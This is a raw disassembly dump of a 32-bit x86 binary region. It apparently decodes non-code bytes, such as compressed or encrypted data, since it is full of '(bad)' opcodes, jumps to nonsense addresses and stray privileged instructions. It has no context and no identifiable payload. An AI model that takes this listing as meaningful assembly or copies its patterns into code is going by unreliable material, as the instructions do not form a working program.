  40cf17:	inc    ecx
  40cf18:	xchg   edi,eax
  40cf19:	pop    es
  40cf1a:	jmp    0xd503:0xb51f29f1
  40cf21:	xchg   ebx,eax
  40cf22:	inc    ebp
  40cf23:	mov    WORD PTR [eax],ds
  40cf25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf26:	aam    0x3e
  40cf28:	(bad)  [ebx]
  40cf2a:	jno    0x40ceb0
  40cf2c:	dec    eax
  40cf2d:	mov    al,0xfd
  40cf2f:	push   cs
  40cf30:	mov    dh,0x5f
  40cf32:	mov    edx,0xaf1f22b
  40cf37:	js     0x40cf98
  40cf39:	sbb    bl,dh
  40cf3b:	and    DWORD PTR [edx-0x47],esi
  40cf3e:	jno    0x40cf3d
  40cf40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf41:	retf   
  40cf42:	rol    DWORD PTR [esi+ebx*4+0xe],1
  40cf46:	xor    edi,ebx
  40cf48:	(bad)
  40cf4d:	scas   eax,DWORD PTR es:[edi]
  40cf4e:	adc    esp,DWORD PTR [esi]
  40cf50:	mov    ebx,0xdd52f580
  40cf55:	or     eax,0x69791484
  40cf5a:	jp     0x40cf60
  40cf5c:	push   eax
  40cf5d:	inc    edi
  40cf5e:	ins    BYTE PTR es:[edi],dx
  40cf5f:	ficomp WORD PTR [eax+0x5e85e221]
  40cf65:	dec    eax
  40cf66:	aam    0x0
  40cf68:	xchg   esp,eax
  40cf69:	inc    eax
  40cf6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf6b:	leave  
  40cf6c:	push   0x41
  40cf6e:	repnz pop ebx
  40cf70:	inc    esp
  40cf71:	or     BYTE PTR [ecx-0x9],0x5a
  40cf75:	dec    edi
  40cf76:	das    
  40cf77:	scas   al,BYTE PTR es:[edi]
  40cf78:	push   ebp
  40cf79:	add    eax,0xbb1c2d46
  40cf7e:	enter  0xf7e8,0xbf
  40cf82:	jns    0x40cf53
  40cf84:	adc    esi,DWORD PTR [ecx-0x1fa2b650]
  40cf8a:	jbe    0x40cf43
  40cf8c:	pop    ebx
  40cf8d:	std    
  40cf8e:	addr16 xchg edx,eax
  40cf90:	pop    esp
  40cf91:	mov    dl,0x63
  40cf93:	lea    ebp,[eax]
  40cf95:	mov    eax,0xa0ab5bcb
  40cf9a:	js     0x40cf98
  40cf9c:	mov    ebp,0x92f69255
  40cfa1:	mov    es,WORD PTR fs:0x72fc984d
  40cfa8:	aam    0x4b
  40cfaa:	fwait
  40cfab:	add    ch,ch
  40cfad:	aas    
  40cfae:	mov    al,0xc6
  40cfb0:	jno    0x40cf4e
  40cfb2:	fwait
  40cfb3:	test   eax,0x30366abe
  40cfb8:	mov    al,0x88
  40cfba:	xor    DWORD PTR [eax],esp
  40cfbc:	jns    0x40cf94
  40cfbe:	sub    BYTE PTR [ebp+edi*8+0x46ed2c2],bh
  40cfc5:	dec    eax
  40cfc6:	push   esp
  40cfc7:	stos   BYTE PTR es:[edi],al
  40cfc8:	mov    eax,es:0xb9660270
  40cfce:	(bad)  
  40cfcf:	sbb    al,0x47
  40cfd1:	pop    ebx
  40cfd2:	ror    BYTE PTR [esi-0x4b],0xea
  40cfd6:	sub    cl,ch
  40cfd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfd9:	add    bl,bl
  40cfdb:	jg     0x40cfcf
  40cfdd:	add    bh,BYTE PTR [esi]
  40cfdf:	sbb    ecx,ebp
  40cfe1:	(bad)  [eax+0x1d]
  40cfe4:	stos   BYTE PTR es:[edi],al
  40cfe5:	sub    eax,0xffffff92
  40cfe8:	jnp    0x40cf85
  40cfea:	dec    DWORD PTR [ebx+0x34f7d300]
  40cff0:	arpl   WORD PTR [esi+eiz*2-0x7d59e9ad],si
  40cff7:	ins    DWORD PTR es:[edi],dx
  40cff8:	outs   dx,BYTE PTR ds:[esi]
  40cff9:	arpl   WORD PTR [edx+0x55],sp
  40cffc:	mov    ebx,0x479adb04
  40d001:	and    ebx,DWORD PTR [ecx]
  40d003:	imul   ecx,DWORD PTR [edi+0x2855e0fa],0x73d34f34
  40d00d:	jg     0x40cfd1
  40d00f:	pop    ss
  40d010:	lods   eax,DWORD PTR ds:[esi]
  40d011:	or     al,0xbe
  40d013:	sub    al,BYTE PTR [ebx+0x54]
  40d016:	cmc    
  40d017:	pushf  
  40d018:	shl    BYTE PTR [ecx],cl
  40d01a:	lock dec ebp
  40d01c:	retf   0xfe04
  40d01f:	loopne 0x40cfee
  40d021:	out    0x41,eax
  40d023:	iret   
  40d024:	(bad)  
  40d026:	jo     0x40d09f
  40d028:	pop    esi
  40d029:	out    dx,al
  40d02a:	out    dx,eax
  40d02b:	add    bh,BYTE PTR [edi+0x69]
  40d02e:	dec    ebx
  40d02f:	(bad)  
  40d030:	or     edi,esi
  40d032:	inc    esi
  40d033:	fwait
  40d034:	inc    esi
  40d035:	mov    ds:0x5ea63ac0,eax
  40d03a:	pop    ss
  40d03b:	ret    
  40d03c:	sahf   
  40d03d:	into   
  40d03e:	inc    ebx
  40d03f:	push   ecx
  40d040:	push   edi
  40d041:	aaa    
  40d042:	std    
  40d043:	inc    edx
  40d044:	ins    BYTE PTR es:[edi],dx
  40d045:	xchg   edi,eax
  40d046:	out    0xaf,al
  40d048:	sub    al,0x10
  40d04a:	loopne 0x40d02f
  40d04c:	les    edi,FWORD PTR [esi-0x5c]
  40d04f:	mov    esp,DWORD PTR [ebp+eax*8-0x49]
  40d053:	adc    BYTE PTR [esi],dh
  40d055:	leave  
  40d056:	bound  edi,QWORD PTR [di-0x24]
  40d05a:	xor    edi,DWORD PTR ds:0x852e4276
  40d060:	imul   edx,esi,0xf7ffb65
  40d066:	push   ds
  40d067:	mov    ch,0x46
  40d069:	mov    dl,0x17
  40d06b:	imul   ebp,DWORD PTR [edi],0x7c664fad
  40d071:	cmp    al,0xfe
  40d073:	mov    edx,0xedd6d33a
  40d078:	xchg   ecx,eax
  40d079:	dec    esi
  40d07a:	push   ecx
  40d07b:	adc    ch,cl
  40d07d:	lea    ecx,[ebp+0x3f]
  40d080:	and    ah,BYTE PTR [ecx]
  40d082:	aad    0xba
  40d084:	jle    0x40d0d9
  40d086:	daa    
  40d087:	pop    ds
  40d088:	(bad)  
  40d089:	stc    
  40d08a:	je     0x40d014
  40d08c:	pop    ds
  40d08d:	inc    eax
  40d08e:	or     eax,DWORD PTR [ebx-0x170d204b]
  40d094:	inc    edx
  40d095:	shl    DWORD PTR [edx],cl
  40d097:	jns    0x40d10c
  40d099:	sub    eax,0x9e9bb519
  40d09e:	inc    eax
  40d09f:	adc    BYTE PTR [esi+0x6d],dh
  40d0a2:	add    ebp,0xd8fb3bc9
  40d0a8:	adc    ch,BYTE PTR [edx]
  40d0aa:	call   DWORD PTR [ecx+0x37a64e32]
  40d0b0:	push   ebx
  40d0b1:	mov    dh,ah
  40d0b3:	outs   dx,BYTE PTR ds:[esi]
  40d0b4:	rcr    DWORD PTR [ecx-0x48],1
  40d0b7:	std    
  40d0b8:	(bad)  
  40d0b9:	jle    0x40d0cd
  40d0bb:	push   ss
  40d0bc:	add    bh,bl
  40d0be:	mov    ah,0xeb
  40d0c0:	ret    0x3633
  40d0c3:	leave  
  40d0c4:	add    esi,ebx
  40d0c6:	in     eax,dx
  40d0c7:	pop    esp
  40d0c8:	and    cl,BYTE PTR [ebx+0x22]
  40d0cb:	xchg   ebx,eax
  40d0cc:	add    DWORD PTR [edi],esp
  40d0ce:	mov    eax,ds:0xfb20cd25
  40d0d3:	adc    al,0xa5
  40d0d5:	and    eax,0xa11310ba
  40d0da:	add    DWORD PTR [edx],edx
  40d0dc:	shl    BYTE PTR [ecx-0x6700c428],1
  40d0e2:	mov    WORD PTR [ebx+ebp*1+0x203fb55],cs
  40d0e9:	dec    edi
  40d0ea:	pushf  
  40d0eb:	cmc    
  40d0ec:	test   eax,0xb5dde5cf
  40d0f1:	mov    cl,0xa0
  40d0f3:	mov    ebx,0xd6d62bef
  40d0f8:	int    0xe
  40d0fa:	add    al,BYTE PTR [esp+edi*4-0x32]
  40d0fe:	jp     0x40d09c
  40d100:	or     DWORD PTR ds:0xcb7778dc,esp
  40d106:	or     DWORD PTR [edx],ebx
  40d108:	fld    TBYTE PTR [ebx-0x3a4f2b82]
  40d10e:	jp     0x40d155
  40d110:	int    0x28
  40d112:	sbb    DWORD PTR [ebp+eax*2+0xe52a370],ebx
  40d119:	push   esi
  40d11a:	adc    BYTE PTR [esi+0x8],dl
  40d11d:	adc    eax,0x2defe162
  40d122:	enter  0xe181,0xb1
  40d126:	lahf   
  40d127:	movzx  eax,BYTE PTR [ebp+0x3feb530b]
  40d12e:	push   esp
  40d12f:	mov    edx,0xbdbd698a
  40d134:	pushf  
  40d135:	lods   eax,DWORD PTR ds:[esi]
  40d136:	dec    ebx
  40d137:	push   ds
  40d138:	gs fsub DWORD PTR fs:[edi+0x1]
  40d13d:	mov    edx,0x3ca14eb4
  40d142:	leave  
  40d143:	or     eax,0xd1221e06
  40d148:	and    ch,BYTE PTR [ecx-0x5c611c97]
  40d14e:	imul   edi,DWORD PTR [edi+0x6],0x38a559f
  40d155:	mov    ah,0xdb
  40d157:	ja     0x40d113
  40d159:	jmp    0xe41:0x8d8da92
  40d160:	dec    edx
  40d161:	ja     0x40d1b7
  40d163:	lods   eax,DWORD PTR es:[esi]
  40d165:	(bad)  
  40d166:	xchg   ebx,eax
  40d167:	mov    ds:0xb3e9740b,al
  40d16c:	(bad)  
  40d16d:	aam    0x64
  40d16f:	sbb    BYTE PTR [edx+0x4d],bl
  40d172:	dec    edi
  40d173:	mov    ds:0x31523827,eax
  40d178:	pop    ds
  40d179:	iret   
  40d17a:	pop    ds
  40d17b:	aam    0x47
  40d17d:	les    esi,FWORD PTR [ebx-0xa]
  40d180:	push   ebp
  40d181:	and    dh,BYTE PTR [ebp+0x78856bd5]
  40d187:	jb     0x40d1ab
  40d189:	fmul   DWORD PTR [ebp+0x1e9484e8]
  40d18f:	iret   
  40d190:	(bad)  
  40d191:	lock pop edx
  40d193:	mov    ebp,0x8742cd3
  40d198:	add    edx,esi
  40d19a:	jecxz  0x40d192
  40d19c:	fs mov ch,0x1a
  40d19f:	jne    0x40d1f8
  40d1a1:	(bad)  
  40d1a2:	push   edi
  40d1a3:	push   es
  40d1a4:	test   eax,0x8e9ff199
  40d1a9:	rcl    eax,1
  40d1ab:	xchg   esp,eax
  40d1ac:	xchg   edi,eax
  40d1ad:	inc    eax
  40d1ae:	cmc    
  40d1af:	loop   0x40d22b
  40d1b1:	pop    ds
  40d1b2:	iret   
  40d1b3:	push   0xffffffea
  40d1b5:	xor    DWORD PTR gs:[esi],0xc8ac54ad
  40d1bc:	aad    0x67
  40d1be:	sub    DWORD PTR ds:0xb14c86dc,ebx
  40d1c4:	and    al,BYTE PTR [ecx+0x2b]
  40d1c7:	in     al,0x7
  40d1c9:	mov    dh,0x8e
  40d1cb:	sub    ecx,DWORD PTR ds:0x478c316
  40d1d1:	rcl    BYTE PTR [ebx],cl
  40d1d3:	adc    BYTE PTR [edi+eiz*4+0x4fd87a81],dh
  40d1da:	push   ss
  40d1db:	stc    
  40d1dc:	sbb    DWORD PTR [ecx],esi
  40d1de:	enter  0xbc92,0xb7
  40d1e2:	sub    al,0x38
  40d1e4:	xlat   BYTE PTR ds:[ebx]
  40d1e5:	mov    eax,ds:0x5601e05f
  40d1ea:	dec    ecx
  40d1eb:	inc    eax
  40d1ec:	lock neg DWORD PTR [esi]
  40d1ef:	sub    BYTE PTR [eax-0x553558a3],0x33
  40d1f6:	and    eax,0x540a3d02
  40d1fb:	repz push esp
  40d1fd:	xchg   esi,eax
  40d1fe:	mov    cl,0xd4
  40d200:	idiv   edx
  40d202:	nop
  40d203:	mov    esp,0x13a36ccf
  40d208:	adc    eax,0xa01e8bb0
  40d20d:	in     eax,0x8a
  40d20f:	pop    edi
  40d210:	sub    eax,0x957b0ff5
  40d215:	sub    DWORD PTR [ebx],edi
  40d217:	and    esi,ecx
  40d219:	neg    DWORD PTR [ecx+0x328655ce]
  40d21f:	or     BYTE PTR [ebp+0x69],dh
  40d222:	sub    ebp,DWORD PTR [esi-0x7cd60093]
  40d228:	das    
  40d229:	call   DWORD PTR [ebx+0x2b]
  40d22c:	dec    esp
  40d22d:	lock lods al,BYTE PTR ds:[esi]
  40d22f:	push   ebx
  40d230:	sbb    BYTE PTR [eax-0x5c8dafb3],al
  40d236:	(bad)  [ebp-0x65]
  40d239:	js     0x40d26f
  40d23b:	inc    esi
  40d23c:	sahf   
  40d23d:	xchg   esi,eax
  40d23e:	adc    DWORD PTR [esi-0x4d],ebx
  40d241:	sti    
  40d242:	add    DWORD PTR fs:[eax+0x3b],eax
  40d246:	sar    bh,cl
  40d248:	sub    ebp,DWORD PTR [ebx+0x422afe96]
  40d24e:	push   ecx
  40d24f:	imul   ecx,DWORD PTR [edx],0xbfb7b89b
  40d255:	sub    al,0x2c
  40d257:	sbb    DWORD PTR [ebx-0x3f6007e8],esp
  40d25d:	xchg   ecx,eax
  40d25e:	int    0x54
  40d260:	js     0x40d205
  40d262:	shl    ch,0xb2
  40d265:	jnp    0x40d270
  40d267:	adc    edx,esi
  40d269:	test   dh,al
  40d26b:	push   edi
  40d26c:	push   eax
  40d26d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d26e:	jne    0x40d25a
  40d270:	and    eax,0x7da7dc5e
  40d275:	push   ss
  40d276:	inc    ecx
  40d277:	lods   eax,DWORD PTR ds:[esi]
  40d278:	mov    ch,0x10
  40d27a:	pop    es
  40d27b:	or     DWORD PTR [ecx+edx*2+0x1d],0xffffff9f
  40d280:	xchg   esp,eax
  40d281:	lods   eax,DWORD PTR ds:[esi]
  40d282:	daa    
  40d283:	loop   0x40d2d1
  40d285:	xor    dh,BYTE PTR [ecx+0x3e5b348c]
  40d28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d28c:	jbe    0x40d26c
  40d28e:	sub    edx,DWORD PTR cs:[esi-0x10]
  40d292:	sub    al,0xc0
  40d294:	mov    eax,ds:0x6f4cdebf
  40d299:	jne    0x40d30c
  40d29b:	retf   
  40d29c:	and    eax,DWORD PTR [ebp+esi*1-0x686b2d9a]
  40d2a3:	mov    dh,0x42
  40d2a5:	dec    edx
  40d2a6:	sub    dl,BYTE PTR [ebx]
  40d2a8:	fistp  WORD PTR [ebx]
  40d2aa:	jnp    0x40d2a8
  40d2ac:	int    0x4f
  40d2ae:	ins    BYTE PTR es:[edi],dx
  40d2af:	(bad)  
  40d2b0:	leave  
  40d2b1:	xchg   ebp,eax
  40d2b2:	fisttp WORD PTR [ecx+0x427ff9f4]
  40d2b8:	xchg   esp,eax
  40d2b9:	les    edx,FWORD PTR [edx-0x48e816e5]
  40d2bf:	fwait
  40d2c0:	cmp    DWORD PTR [ecx+0x186496fc],edx
  40d2c6:	jmp    0x40d304
  40d2c8:	(bad)
  40d2cb:	mov    bl,0x77
  40d2cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ce:	fst    QWORD PTR [edx+0x4f6cae85]
  40d2d4:	shl    DWORD PTR [ecx+0x7a],1
  40d2d7:	adc    BYTE PTR ds:0xfba0abb9,bl
  40d2dd:	pop    es
  40d2de:	es dec eax
  40d2e0:	and    ah,ah
  40d2e2:	in     eax,0x14
  40d2e4:	xchg   ebp,eax
  40d2e5:	test   eax,0x9fe5283d
  40d2ea:	jp     0x40d27b
  40d2ec:	xor    ecx,DWORD PTR [eax+0x73]
  40d2ef:	dec    edi
  40d2f0:	loop   0x40d30e
  40d2f2:	lods   al,BYTE PTR ds:[esi]
  40d2f3:	cdq    
  40d2f4:	rol    BYTE PTR [edx+0x2],cl
  40d2f7:	dec    edx
  40d2f8:	jns    0x40d28d
  40d2fa:	jo     0x40d2ad
  40d2fc:	push   cs
  40d2fd:	ja     0x40d375
  40d2ff:	mov    esi,0x159bff63
  40d304:	(bad)  
  40d305:	shl    DWORD PTR [ecx-0x66b6bfc4],cl
  40d30b:	xchg   edx,eax
  40d30c:	push   ds
  40d30d:	imul   esp,DWORD PTR [esi],0xffffff83
  40d310:	stc    
  40d311:	jmp    0x4ac4:0xe04d177f
  40d318:	std    
  40d319:	lahf   
  40d31a:	mov    cl,0xd7
  40d31c:	jno    0x40d39b
  40d31e:	addr16 sbb eax,0x12b2b777
  40d324:	pop    ds
  40d325:	adc    ebx,ebp
  40d327:	inc    ecx
  40d328:	adc    edi,DWORD PTR [ebp+0x68]
  40d32b:	sbb    al,0x3b
  40d32d:	cmp    al,BYTE PTR ds:0xae29d557
  40d333:	sub    DWORD PTR [edx+0x2e710c6a],ebx
  40d339:	mul    DWORD PTR [ecx+0x5ffd2005]
  40d33f:	aaa    
  40d340:	inc    ebx
  40d341:	jg     0x40d36f
  40d343:	dec    ecx
  40d344:	mov    edi,0xfefee35c
  40d349:	pop    ebx
  40d34a:	ret    
  40d34b:	sti    
  40d34c:	adc    eax,0x65f3546b
  40d351:	cmp    eax,0x92654618
  40d356:	dec    esp
  40d357:	add    eax,0xef5b9f50
  40d35c:	pop    ecx
  40d35d:	jge    0x40d395
  40d35f:	mov    esp,0x4d944db
  40d364:	adc    eax,0x79635336
  40d369:	mov    al,ds:0xe026f690
  40d36e:	mov    bh,0xcf
  40d370:	lahf   
  40d371:	mov    eax,0x43dc7767
  40d376:	push   ds
  40d377:	sbb    eax,0x945c0496
  40d37c:	push   esp
  40d37d:	loopne 0x40d377
  40d37f:	lock (bad) 
  40d381:	mov    esi,0x4d51d316
  40d386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d387:	scas   eax,DWORD PTR es:[edi]
  40d388:	cmp    al,0xee
  40d38a:	out    dx,eax
  40d38b:	push   esp
  40d38c:	repnz add BYTE PTR [eax+0xc],0x36
  40d391:	mov    dh,0x73
  40d393:	dec    ebp
  40d394:	mov    ebx,DWORD PTR [ebx-0x213839fb]
  40d39a:	adc    bl,ch
  40d39c:	lea    edx,[esi]
  40d39e:	jns    0x40d344
  40d3a0:	inc    edx
  40d3a1:	je     0x40d359
  40d3a3:	mov    cl,0x4f
  40d3a5:	fild   DWORD PTR [edx]
  40d3a7:	aas    
  40d3a8:	jle    0x40d3c5
  40d3aa:	sbb    bl,BYTE PTR [eax+ecx*8+0x1988fd97]
  40d3b1:	loope  0x40d3eb
  40d3b3:	xchg   esi,eax
  40d3b4:	adc    esp,DWORD PTR [eax+0x3]
  40d3b7:	mov    ebp,?
  40d3b9:	outs   dx,BYTE PTR ds:[esi]
  40d3ba:	adc    eax,0x6ceb2144
  40d3bf:	outs   dx,DWORD PTR ds:[esi]
  40d3c0:	dec    edi
  40d3c1:	fwait
  40d3c2:	ret    0x5b64
  40d3c5:	icebp  
  40d3c6:	lea    edx,ds:0x5b291a88
  40d3cc:	dec    eax
  40d3cd:	aam    0xfc
  40d3cf:	xchg   esp,eax
  40d3d0:	jbe    0x40d414
  40d3d2:	iret   
  40d3d3:	add    ah,BYTE PTR [ebp+0x7c9d9b67]
  40d3d9:	dec    esi
  40d3da:	ds and edi,edx
  40d3dd:	push   ebp
  40d3de:	fwait
  40d3df:	mov    ch,0x85
  40d3e1:	add    eax,0x1212caa7
  40d3e6:	repz inc esp
  40d3e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e9:	mov    cl,cl
  40d3eb:	inc    ebp
  40d3ec:	cmp    BYTE PTR ds:0x691df7a4,0x17
  40d3f3:	out    0x39,al
  40d3f5:	cmc    
  40d3f6:	rol    BYTE PTR fs:[ebx],cl
  40d3f9:	push   cs
  40d3fa:	xor    eax,0x59c1c7d8
  40d3ff:	inc    ecx
  40d400:	aas    
  40d401:	push   edi
  40d402:	pop    edx
  40d403:	xlat   BYTE PTR ds:[ebx]
  40d405:	bound  ebx,QWORD PTR [ebp+0x37]
  40d408:	cmp    esp,ebx
  40d40a:	in     eax,dx
  40d40b:	outs   dx,BYTE PTR ds:[esi]
  40d40c:	push   ecx
  40d40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d40e:	mul    BYTE PTR [eax+0x3ed02c9]
  40d414:	push   ss
  40d415:	je     0x40d455
  40d417:	xor    eax,0xe3ea447f
  40d41c:	sbb    ah,bh
  40d41e:	or     al,BYTE PTR [ebx+0x2d]
  40d421:	into   
  40d422:	jns    0x40d47b
  40d424:	mov    ebp,0xfff23538
  40d429:	mov    eax,ds:0x3f581008
  40d42e:	sar    BYTE PTR ds:0x8164e59a,cl
  40d434:	push   edi
  40d435:	ins    BYTE PTR es:[edi],dx
  40d436:	pop    ebp
  40d437:	add    BYTE PTR [edi+edi*2-0xe],dl
  40d43b:	push   0x1a
  40d43d:	add    bl,BYTE PTR [eax]
  40d43f:	lahf   
  40d440:	daa    
  40d441:	fsubr  DWORD PTR [eax-0x4a]
  40d444:	cdq    
  40d445:	inc    eax
  40d446:	dec    ebp
  40d447:	fucomp st(2)
  40d449:	inc    edx
  40d44a:	out    dx,eax
  40d44b:	stos   BYTE PTR es:[edi],al
  40d44c:	xchg   edi,eax
  40d44d:	cmp    al,0x11
  40d44f:	mov    ecx,0xc513b5ae
  40d454:	jo     0x40d3e2
  40d456:	sub    esi,DWORD PTR [ecx-0x49]
  40d459:	pop    ss
  40d45a:	lods   al,BYTE PTR ds:[esi]
  40d45b:	in     al,dx
  40d45c:	mov    eax,0x19f53543
  40d461:	fwait
  40d462:	add    eax,0xbfe61383
  40d467:	adc    al,0x67
  40d469:	jge    0x40d4e6
  40d46b:	mov    edi,0x6c9a04fc
  40d470:	lahf   
  40d471:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d472:	int    0x5a
  40d474:	mov    esp,0x16d4134
  40d479:	inc    ebp
  40d47a:	scas   eax,DWORD PTR es:[edi]
  40d47b:	in     al,0xa0
  40d47d:	stos   DWORD PTR es:[edi],eax
  40d47e:	loopne 0x40d4a8
  40d480:	lahf   
  40d481:	loop   0x40d500
  40d483:	adc    esp,DWORD PTR [esi]
  40d485:	arpl   si,ax
  40d487:	mov    edx,0xcd26af1f
  40d48c:	shl    BYTE PTR [bp+si-0x7f6f],0x5b
  40d492:	in     eax,0xd0
  40d494:	daa    
  40d495:	(bad)  
  40d496:	sahf   
  40d497:	lds    esi,FWORD PTR [ecx-0x71c47cd3]
  40d49d:	mov    ds:0x9b1c39ff,eax
  40d4a2:	xchg   edi,eax
  40d4a3:	outs   dx,DWORD PTR ds:[esi]
  40d4a4:	ja     0x40d501
  40d4a6:	stos   BYTE PTR es:[edi],al
  40d4a7:	mov    DWORD PTR [esi+edx*4+0x6a9f0f64],ecx
  40d4ae:	ds pop es
  40d4b0:	mov    al,0x1e
  40d4b2:	jnp    0x40d45f
  40d4b4:	ret    
  40d4b5:	sbb    al,0xac
  40d4b7:	adc    al,0xd2
  40d4b9:	xchg   esp,eax
  40d4ba:	add    BYTE PTR [eax],al
  40d4bc:	repnz and ecx,esi
  40d4bf:	ja     0x40d462
  40d4c1:	sbb    eax,0x411b51cd
  40d4c6:	or     al,0x2b
  40d4c8:	rcl    DWORD PTR [eax+0x526553ee],1
  40d4ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4cf:	mov    al,0x85
  40d4d1:	adc    BYTE PTR [ebp-0x4e],al
  40d4d4:	add    al,0x6a
  40d4d6:	mov    eax,cs
  40d4d8:	xor    BYTE PTR [edx-0x7d],cl
  40d4db:	out    0x72,eax
  40d4dd:	mov    bl,0xb5
  40d4df:	adc    BYTE PTR [edi],ch
  40d4e1:	fwait
  40d4e2:	je     0x40d530
  40d4e4:	rcr    DWORD PTR [eax+0x620ea937],cl
  40d4ea:	sbb    al,0x8
  40d4ec:	adc    ebp,DWORD PTR [edx]
  40d4ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4ef:	stc    
  40d4f0:	mov    ebp,0xf640ecd0
  40d4f5:	int3   
  40d4f6:	daa    
  40d4f7:	fnstenv [edi]
  40d4f9:	xor    DWORD PTR fs:[edi],0x28df7a16
  40d500:	je     0x40d485
  40d502:	imul   BYTE PTR [ecx-0x4f]
  40d505:	das    
  40d506:	outs   dx,DWORD PTR ds:[esi]
  40d507:	cld    
  40d508:	out    0x11,eax
  40d50a:	loop   0x40d4e5
  40d50c:	daa    
  40d50d:	fld    QWORD PTR [ebx]
  40d50f:	fcmove st,st(4)
  40d511:	add    al,0xa5
  40d513:	test   eax,0xe68ac2ec
  40d518:	fcom   DWORD PTR [ebx+0x19]
  40d51b:	inc    esi
  40d51c:	cmp    DWORD PTR [edi],ebx
  40d51e:	sub    DWORD PTR [eax],ebp
  40d520:	dec    edx
  40d521:	cli    
  40d522:	jns    0x40d4e8
  40d524:	mov    bh,0x62
  40d526:	in     al,0x69
  40d528:	icebp  
  40d529:	fdivr  QWORD PTR [eax-0x30]
  40d52c:	xor    bh,BYTE PTR es:[eax-0x57]
  40d530:	push   edi
  40d531:	outs   dx,DWORD PTR ds:[esi]
  40d532:	inc    ebx
  40d533:	push   ds
  40d534:	nop
  40d535:	dec    ebx
  40d536:	inc    edi
  40d537:	push   cs
  40d538:	jbe    0x40d581
  40d53a:	(bad)  
  40d53b:	int3   
  40d53c:	adc    al,BYTE PTR [ebp+0x17dbeda5]
  40d542:	dec    ebp
  40d543:	mov    ebx,0xba6d8438
  40d548:	add    ch,ch
  40d54a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d54b:	mov    eax,0x57227238
  40d550:	xchg   BYTE PTR [eax+0x62],ah
  40d553:	jb     0x40d595
  40d555:	add    eax,0x5885cbc2
  40d55a:	push   edi
  40d55b:	pop    edx
  40d55c:	and    bl,al
  40d55e:	mov    ds:0xd897e324,al
  40d563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d564:	je     0x40d5d3
  40d566:	clc    
  40d567:	bound  esp,QWORD PTR [ebp+0x799bb3b4]
  40d56d:	test   eax,0xfb890c74
  40d572:	or     DWORD PTR [eax+0x4be3825b],ebx
  40d578:	mov    al,ds:0x1f565f0e
  40d57d:	and    cl,BYTE PTR fs:[edx-0x1b0e9428]
  40d584:	fsub   st(1),st
  40d586:	jmp    0x726eafa5
  40d58b:	inc    ecx
  40d58c:	cwde   
  40d58d:	ja     0x40d528
  40d58f:	outs   dx,DWORD PTR ds:[esi]
  40d590:	inc    edi
  40d591:	mov    BYTE PTR [ebp+0x35a16644],ch
  40d597:	sbb    eax,0x17370b63
  40d59c:	add    eax,0xed004c69
  40d5a1:	add    eax,0x2785873e
  40d5a6:	nop
  40d5a7:	ret    0x7f7e
  40d5aa:	mov    ss,ebp
  40d5ac:	das    
  40d5ad:	sbb    BYTE PTR [eax+ebp*8],dl
  40d5b0:	jo     0x40d54c
  40d5b2:	inc    eax
  40d5b3:	mov    edx,0xdad717a3
  40d5b8:	and    eax,0x443538ed
  40d5bd:	cs jns 0x40d638
  40d5c0:	and    edi,esp
  40d5c2:	shr    ch,cl
  40d5c4:	scas   al,BYTE PTR es:[edi]
  40d5c5:	push   eax
  40d5c6:	mov    ah,0x65
  40d5c8:	leave  
  40d5c9:	sbb    eax,0x871f2557
  40d5ce:	add    ecx,0xaf74edd3
  40d5d4:	mov    WORD PTR [ebp+ebp*2-0x4d88c15d],es
  40d5db:	bnd jno 0x40d566
  40d5de:	scas   al,BYTE PTR es:[edi]
  40d5df:	lods   al,BYTE PTR ds:[esi]
  40d5e0:	(bad)  
  40d5e1:	scas   al,BYTE PTR es:[edi]
  40d5e2:	out    0xac,al
  40d5e4:	dec    edi
  40d5e5:	in     eax,0x70
  40d5e7:	jl     0x40d667
  40d5e9:	out    0x94,eax
  40d5eb:	jp     0x40d618
  40d5ed:	scas   al,BYTE PTR es:[edi]
  40d5ee:	sbb    eax,0x8cb8c9ba
  40d5f3:	nop
  40d5f4:	xchg   ebp,eax
  40d5f5:	clc    
  40d5f6:	add    al,BYTE PTR [edi]
  40d5f8:	in     al,0xd6
  40d5fa:	and    DWORD PTR [eax+edi*2],edx
  40d5fd:	sbb    DWORD PTR [eax-0x584b05b],ebx
  40d603:	sbb    eax,0x40b50ea5
  40d608:	jnp    0x40d5ec
  40d60a:	cmp    eax,0x3cb972e8
  40d60f:	mov    WORD PTR [esp+ebx*4+0xb6e32c3],cs
  40d616:	and    DWORD PTR [ecx],ecx
  40d618:	loop   0x40d5ca
  40d61a:	mov    edi,0xc89cf1be
  40d61f:	(bad)  [edi]
  40d621:	cld    
  40d622:	push   edi
  40d623:	push   ebp
  40d624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d625:	xor    bl,dl
  40d627:	pushf  
  40d628:	mov    dl,0xa8
  40d62a:	sub    edi,DWORD PTR [ecx+0x4b164d89]
  40d630:	stos   BYTE PTR es:[edi],al
  40d631:	pop    esi
  40d632:	cmp    al,0x12
  40d634:	in     al,dx
  40d635:	out    0x49,al
  40d637:	test   eax,0xb0f20d3c
  40d63c:	add    ebp,esp
  40d63e:	xchg   ebp,eax
  40d63f:	dec    ecx
  40d640:	rcl    DWORD PTR [ebx],cl
  40d642:	cmp    al,0x56
  40d644:	push   0x40
  40d646:	out    dx,al
  40d647:	stos   BYTE PTR es:[edi],al
  40d648:	dec    eax
  40d649:	leave  
  40d64a:	fs jp  0x40d69f
  40d64d:	mov    BYTE PTR gs:0x3323f58e,0x48
  40d655:	cmp    bh,BYTE PTR [eax-0x75]
  40d658:	daa    
  40d659:	aad    0x68
  40d65b:	rcl    DWORD PTR [eax-0x3c],cl
  40d65e:	adc    eax,0x4da6ff54
  40d663:	mov    ebp,0xeab7e699
  40d668:	xchg   esp,eax
  40d669:	popa   
